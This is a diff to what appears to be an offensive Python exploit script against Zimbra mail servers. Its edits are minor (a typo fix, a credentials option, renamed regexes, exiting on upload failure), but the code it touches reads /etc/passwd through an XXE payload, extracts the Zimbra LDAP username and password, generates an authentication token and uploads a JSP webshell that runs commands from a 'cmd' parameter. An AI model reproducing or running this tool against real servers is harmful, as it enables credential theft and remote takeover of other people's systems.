@@ -1,4 +1,3 @@
-from distutils.command.upload import upload
 from typing import Literal
 from urllib.parse import urlparse
 from requests import get, post
@@ -7,6 +6,9 @@ from rich import print
 from re import compile, findall
 from urllib3 import disable_warnings
 disable_warnings()
+
+# Used only to kill the program if webshell upload fail
+import sys
 
 
 def connect(url: str) -> None:
@@ -33,7 +35,15 @@ def host_is_alive(args) -> None:
 
 
 def read_passwd(xml_file_path, args) -> None:
-    " Read /etc/passwd with XXE vulnerabiluty "
+    " Read /etc/passwd with XXE vulnerability "
+
+    if(args.kc):
+        auth = args.kc
+        auth = auth.split(":")
+        username = auth[0]
+        password = auth[1]
+        print(f"[yellow]> Using credentials: [b]{username}:{password}[/] [/]\n")
+        get_low_priv_token(username, password, args)
 
     passwd_payload: Literal = """
 <!DOCTYPE xxe [
@@ -99,14 +109,14 @@ def get_credentials(xml_file_path, args) -> None:
     }
 
     credentials_request = post(xml_file_path, **xxe_props)
-    credentials_response = credentials_request.text
+    credentials_response: str = credentials_request.text
 
-    rgx_username = compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
-    rgx_password = compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
+    re_username = compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
+    re_password = compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
 
-    if rgx_username.findall(credentials_response) and rgx_password.findall(credentials_response):
-        username: str = rgx_username.findall(credentials_response)[0][2]
-        password: str = rgx_password.findall(credentials_response)[0][2]
+    if re_username.findall(credentials_response) and re_password.findall(credentials_response):
+        username: str = re_username.findall(credentials_response)[0][2]
+        password: str = re_password.findall(credentials_response)[0][2]
 
         print("[green]> Credentials collected, generating low privileged token now...[/]")
         print(f"[yellow]> Username: {username} & Password: {password}[/]\n")
@@ -280,7 +290,8 @@ if (request.getParameter("cmd") != null) {
 
     for error, desc in errors_list.items():
         if error in upload_response:
-            return print(desc)
+            print(desc)
+            sys.exit(1)
 
     if("(1,'null')" in upload_response):
         print(f"[green]> Webshell uploaded sucessfully! Link to access: {upload_path}")
